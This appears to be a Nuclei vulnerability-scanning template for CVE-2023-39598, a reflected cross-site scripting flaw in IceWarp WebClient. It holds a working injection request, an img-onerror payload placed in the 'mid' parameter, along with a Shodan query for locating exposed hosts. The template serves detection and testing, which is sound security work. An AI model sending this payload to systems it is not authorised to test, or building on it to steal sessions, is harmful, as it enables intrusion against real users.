http:
- matchers:
  - condition: and
    type: word
    words:
    - <img src=x onerror=confirm(document.domain)>
    - icewarp
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/webmail/?mid={{to_lower(rand_base(4))}}"><img src=x onerror=confirm(document.domain)>'
id: CVE-2023-39598
info:
  author: Imjust0
  classification:
    cpe: cpe:2.3:a:icewarp:webclient:10.2.1:*:*:*:*:*:*:*
    cve-id: CVE-2023-39598
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.82679
    epss-score: 0.01072
  description: 'Cross Site Scripting vulnerability in IceWarp Corporation WebClient
    v.10.2.1 allows a remote attacker to execute arbitrary code via a crafted payload
    to the mid parameter.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: webclient
    shodan-query: title:"icewarp"
    vendor: icewarp
    verified: 'true'
  name: IceWarp Email Client - Cross Site Scripting
  reference:
  - https://medium.com/@muthumohanprasath.r/reflected-cross-site-scripting-on-icewarp-webclient-product-cve-2023-39598-9598b92da49c
  - https://nvd.nist.gov/vuln/detail/CVE-2023-39598
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39598
  - https://medium.com/%40muthumohanprasath.r/reflected-cross-site-scripting-on-icewarp-webclient-product-cve-2023-39598-9598b92da49c
  severity: medium
  tags: cve2023,cve,xss,icewarp
